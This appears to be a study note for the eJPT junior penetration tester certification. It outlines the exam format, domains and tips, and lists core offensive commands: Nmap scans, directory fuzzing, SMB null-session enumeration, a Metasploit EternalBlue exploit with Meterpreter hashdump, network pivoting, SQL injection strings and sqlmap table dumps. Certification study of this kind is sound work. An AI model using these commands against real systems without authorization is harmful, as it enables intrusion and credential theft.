---
title: eJPT — eLearnSecurity Junior Penetration Tester
tags:
  - foundational
  - cert
  - eJPT
  - INE
  - junior-pentest
  - recon
  - exploitation
  - web
  - network
topic: Certification Study
difficulty: foundational
created: 2026-03-26
updated: 2026-03-26
source: INE official eJPT syllabus, eLearnSecurity
---

# 🎓 eJPT — eLearnSecurity Junior Penetration Tester

## Overview
The eJPT is an entry-level penetration testing certification from INE (formerly eLearnSecurity). It validates foundational offensive security skills through a fully hands-on, browser-based exam — no multiple choice. Recommended as a first cert before OSCP.

**Exam format:** 3-day practical lab exam (72 hours), ~20 questions answered by performing actual attacks on a live network. Pass mark: ~70%.

**Cost:** ~$200 USD (includes course access via INE Starter pass or bundle)

**Recommended path:** INE PTS (Penetration Testing Student) course → eJPT exam

---

## Exam Domains & Topics

### 1. Penetration Testing Basics
- Penetration testing phases (recon, scanning, exploitation, post-exploitation, reporting)
- Rules of engagement, scope, legal considerations
- Reporting structure and findings documentation
- PTES (Penetration Testing Execution Standard)

### 2. Networking Basics
- TCP/IP fundamentals, routing, subnetting
- Identifying live hosts, open ports, services
- Packet analysis fundamentals
- Pivoting through networks (routing, proxychains)

### 3. Web Application Security Basics
- HTTP request/response structure
- Common vulnerabilities: SQLi, XSS, directory traversal, file upload
- Using Burp Suite for web testing
- Directory/file enumeration

### 4. Host & Network Auditing
- Information gathering with Nmap (host discovery, port scan, service detection)
- Vulnerability scanning basics
- SMB enumeration
- FTP, SSH, Telnet enumeration

### 5. Exploitation
- Metasploit Framework fundamentals (msfconsole, search, use, set, run)
- Exploit known vulnerabilities (MS17-010, vsftpd backdoor, etc.)
- Meterpreter shell basics
- Basic post-exploitation: hashdump, sysinfo, getuid

---

## Key Skills Tested in the Exam

```
✅ Identify hosts on a network via Nmap ping sweep
✅ Identify open ports and services on discovered hosts
✅ Perform basic web enumeration (directory brute force)
✅ Exploit a known vulnerability using Metasploit
✅ Navigate the network via routing/pivoting through compromised hosts
✅ Retrieve flags/specific information from compromised systems
✅ Identify credentials from captured traffic or misconfigs
✅ Perform basic SQL injection on a web application
```

---

## Core Commands for eJPT

### Network Recon
```bash
# Host discovery — find live hosts on subnet
nmap -sn 192.168.1.0/24
nmap -sn 10.10.10.0/24 --open

# Full port scan + service detection
nmap -sV -sC -p- 10.10.10.10
nmap -A 10.10.10.10

# UDP scan (important — check for SNMP, DNS)
sudo nmap -sU --top-ports 20 10.10.10.10
```

### Web Enumeration
```bash
# Directory fuzzing
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# ffuf
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### SMB Enumeration
```bash
smbclient -L \\\\TARGET_IP\\ -N        # List shares (null session)
smbclient \\\\TARGET_IP\\ShareName -N  # Connect to share
enum4linux -a TARGET_IP                # Full SMB enumeration
```

### Metasploit Workflow
```bash
msfconsole
msf > search ms17-010
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 10.10.10.10
msf > set LHOST 10.10.10.100
msf > run

# Post-exploitation
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > shell
```

### Pivoting with Metasploit
```bash
# Add route through meterpreter session
meterpreter > run autoroute -s 192.168.2.0/24
msf > route add 192.168.2.0/24 [session_id]

# Use auxiliary/server/socks_proxy with proxychains
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > run -j
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT 192.168.2.0/24
```

### SQL Injection Basics
```bash
# Manual test
' OR 1=1 -- -
' OR '1'='1
admin'--

# Automated
sqlmap -u "http://TARGET/page.php?id=1" --dbs
sqlmap -u "http://TARGET/page.php?id=1" -D dbname --tables
sqlmap -u "http://TARGET/page.php?id=1" -D dbname -T users --dump
```

---

## Study Resources

| Resource | URL / Notes |
|---|---|
| INE PTS Course | https://ine.com — Penetration Testing Student |
| TryHackMe eJPT path | Pre-Security, Jr Penetration Tester learning paths |
| HackTheBox Starting Point | Free beginner-friendly boxes |
| eJPT Cheatsheet (community) | Various GitHub repos |

---

## Exam Tips

1. **Route everything** — map the entire network before exploiting
2. **Read questions first** — questions tell you what to find
3. **Don't skip UDP** — sometimes critical services are on UDP
4. **Try every service** — FTP anonymous login, SMB null sessions, default web creds
5. **Metasploit is allowed** — use it; this isn't OSCP
6. **Take notes** — track every IP, service, credential found
7. **72 hours is plenty** — don't rush; read error messages carefully

---

## Related Notes
- Penetration-Testing-Methodology
- Nmap
- Metasploit
- Gobuster
- SQLmap
- Burp-Suite
- OSCP-PEN-200

## References
- INE eJPT: https://ine.com/certifications/ejpt-certification
- eLearnSecurity official objectives

---
<- [[Certs-MOC]]